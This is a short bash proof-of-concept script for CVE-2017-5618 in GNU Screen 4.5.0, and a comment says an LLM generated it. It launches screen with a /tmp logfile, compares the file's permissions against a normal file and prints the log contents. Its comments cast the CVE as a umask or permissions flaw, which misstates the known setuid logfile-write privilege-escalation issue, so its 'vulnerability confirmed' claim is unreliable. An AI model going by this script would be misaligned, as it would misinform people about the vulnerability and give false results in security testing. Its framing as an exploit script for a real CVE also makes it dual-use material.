#!/bin/bash

# Costs around 10€ for the llm to generate this script
# CVE-2017-5618 Proof of Concept
# GNU Screen 4.5.0 logfile permissions vulnerability
# 
# The vulnerability allows local users to create files with insecure permissions
# when using the -L option with a filename argument.

echo "[*] CVE-2017-5618 - GNU Screen 4.5.0 logfile permissions vulnerability PoC"
echo "[*] Current user: $(whoami)"
echo "[*] Current umask: $(umask)"

# Clean up any previous test files
rm -f /tmp/screen_test_log 2>/dev/null

echo ""
echo "[*] Setting restrictive umask 077 (only owner can read/write)"
umask 077

echo "[*] Creating a test file with touch to show expected permissions:"
touch /tmp/test_normal_file
ls -la /tmp/test_normal_file
echo ""

echo "[*] Now exploiting the vulnerability..."
echo "[*] Running: screen -L /tmp/screen_test_log -dm -S test_session sleep 1"

# The vulnerability: screen creates the logfile with default permissions
# BEFORE applying the proper umask, resulting in world-readable logfiles
screen -L /tmp/screen_test_log -dm -S test_session sleep 1

# Wait a moment for screen to create the file
sleep 0.5

echo ""
echo "[*] Checking the created logfile permissions:"
ls -la /tmp/screen_test_log

echo ""
echo "[*] File content (may contain sensitive information):"
cat /tmp/screen_test_log 2>/dev/null || echo "(file is empty or doesn't exist yet)"

echo ""
echo "[!] VULNERABILITY CONFIRMED if the logfile has different permissions than the test file!"
echo "[!] The logfile should have been created with 0600 permissions but likely has 0644 or similar"

# Clean up
screen -X -S test_session quit 2>/dev/null
rm -f /tmp/test_normal_file

echo ""
echo "[*] PoC completed. The vulnerability allows attackers to read screen session logs"
echo "    that may contain sensitive information like passwords, commands, etc."\
